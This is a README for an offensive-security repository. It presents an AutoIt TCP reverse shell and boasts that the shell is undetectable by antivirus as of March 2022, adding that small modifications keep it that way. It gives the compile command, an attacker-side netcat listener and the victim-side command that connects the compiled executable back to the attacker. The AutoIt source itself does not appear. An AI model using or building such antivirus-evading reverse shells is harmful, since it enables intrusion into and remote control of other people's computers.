<div id="top"></div>
<div align="center">
  <a href="https://github.com/0xvinix/offensive-autoit">
    <img src="https://i.imgur.com/4Rapnym.png" alt="Logo" width="500" height="200">
  </a>

  <h3 align="center">Hacking AutoIt</h3>

  <p align="center">
    Simple AutoIt tools for offensive security.
    <br />
    <br />
  </p>
</div>
<br>

<!-- REVERSE SHELL -->
## Simple Reverse Shell

This is yet another simple TCP connection based reverse shell code, however, this is not detected by antivirus systems until today (23/03/2022). Possibly by its date of use, the code will already be quite detectable, but it only takes a few small modifications to make it not.

<br>
<h3> How to compile 🔨</h3>

To compile the code is very simple, you just need AutoIt v3 on your machine, which you can download from the link below.

https://www.autoitscript.com/site/autoit/downloads/

* cmd
  ```sh
  "C:\Program Files (x86)\AutoIt3\Aut2Exe\Aut2exe_x64.exe" /in "reverse_shell.au3" /console
  ```
<br>
<h3> Usage🔌</h3>

After compiling, just open a port using netcat.

* Attacker
  ```sh
  nc -vnlp 443
  ```
And on the victim's machine, run the compiled file passing your ip and port as an argument.

* Victim
  ```sh
  reverse_shell.exe 127.0.0.1 443
  ```
<br>
<h3> Av Detection (23/03/2022) 🐛</h3>

As already mentioned, until the date of creation of this repository, this code is completely undetectable by any antivirus.

<img src="https://antiscan.me/images/result/m3hwPh2nQ4dC.png">

<p align="right">(<a href="#top">back to top</a>)</p>
